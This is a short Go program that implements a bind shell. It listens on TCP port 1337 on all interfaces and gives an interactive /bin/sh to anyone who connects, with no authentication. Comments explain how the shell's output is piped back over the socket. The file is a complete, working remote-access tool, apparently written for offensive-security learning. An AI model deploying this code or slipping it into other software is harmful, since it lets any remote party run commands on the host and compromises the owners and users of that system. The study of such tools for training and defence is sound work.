package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	defer conn.Close()
	cmd := exec.Command("/bin/sh", "-i")

	// io.Pipe() creates synchronised reader and writer
	// everything written to writer gets read by the reader
	readerPipe, writerPipe := io.Pipe()

	// shell will receive commands from connection
	cmd.Stdin = conn
	// shell will send output to writer pipe
	cmd.Stdout = writerPipe

	// since stdout is automatically read by readerPipe we can copy it to
	// our connection and send it back (using goroutine for non-blocking)
	go io.Copy(conn, readerPipe)
	cmd.Run()
}

func main() {
	var addr string
	flag.StringVar(&addr, "addr", "0.0.0.0:1337", "specify address and port to listen on")
	flag.Parse()

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalln("Error while binding port.")
	}

	log.Println("Listening on " + addr)

	for {
		conn, err := listener.Accept()
		fmt.Println("Received connection")
		if err != nil {
			log.Fatalln("Error when accepting connection.")
		}

		go handle(conn)
	}
}
